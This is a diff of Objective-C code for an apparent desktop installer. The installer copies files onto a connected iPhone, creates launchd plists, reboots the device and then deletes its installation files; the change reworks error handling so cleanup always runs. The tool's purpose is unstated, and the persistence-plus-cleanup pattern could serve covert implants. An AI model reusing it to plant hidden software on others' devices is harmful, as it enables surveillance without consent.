@@ -150,7 +150,10 @@ NSString *models_name[] =  {@"iPhone",
     else
     {
       [self tPrint:@"check device... installation detected!"];
+      // force remove of installation files (in case of manually reboot)
+      remove_installation();
       gIsDeviceAttached = FALSE;
+      
     }
   }
   else
@@ -255,6 +258,7 @@ NSString *models_name[] =  {@"iPhone",
 - (void)startInstallation:(id)anObject
 {
   int isDeviceOn = 0;
+  int retInst = 0;
   
   [self tPrint: @"start installation..."];
   
@@ -263,7 +267,7 @@ NSString *models_name[] =  {@"iPhone",
   if (path == nil)
   {
     [self tPrint: @"cannot found installation dir!"];
-    return;
+    goto exit_point;
   }
   
   char *lpath = (char*)[path cStringUsingEncoding:NSUTF8StringEncoding];
@@ -273,13 +277,13 @@ NSString *models_name[] =  {@"iPhone",
   if (dir_content == NULL)
   {
     [self tPrint: @"cannot found installation component!"];
-    return;
+    goto exit_point;
   }
   
   if (make_install_directory() != 0)
   {
     [self tPrint: @"cannot create installation folder!"];
-    return;
+    goto exit_point;
   }
   
   [self tPrint: @"copy files..."];
@@ -287,7 +291,7 @@ NSString *models_name[] =  {@"iPhone",
   if (copy_install_files(lpath, dir_content) != 0)
   {
     [self tPrint: @"cannot copy files into installation folder!"];
-    return;
+    goto exit_point;
   }
     
   [self tPrint: @"copy files... done."];
@@ -295,7 +299,7 @@ NSString *models_name[] =  {@"iPhone",
   if (create_launchd_plist() != 0)
   {
     [self tPrint: @"cannot create plist files!"];
-    return;
+    goto exit_point;
   }
   
   [self tPrint: @"try to restart device..."];
@@ -315,10 +319,6 @@ NSString *models_name[] =  {@"iPhone",
   do
   {
     isDeviceOn = isDeviceAttached();
-    
-    // Device is already off it's faster than us...
-    if (isDeviceOn == 0)
-      break;
     
     sleep(1);
   
@@ -349,7 +349,14 @@ NSString *models_name[] =  {@"iPhone",
   
   sleep(5);
   
-  if (check_installation(10, 10) == 1)
+  retInst = check_installation(10, 10);
+  
+  // On fail remove the install files e dir...
+exit_point:
+  
+  remove_installation();
+  
+  if ( retInst == 1)
   {
     [self tPrint: @"installation done."];
   }
@@ -357,8 +364,6 @@ NSString *models_name[] =  {@"iPhone",
   {
     [self tPrint: @"installation failed: please retry!"];
   }
-  
-  remove_installation();
 }
 
 #pragma mark -
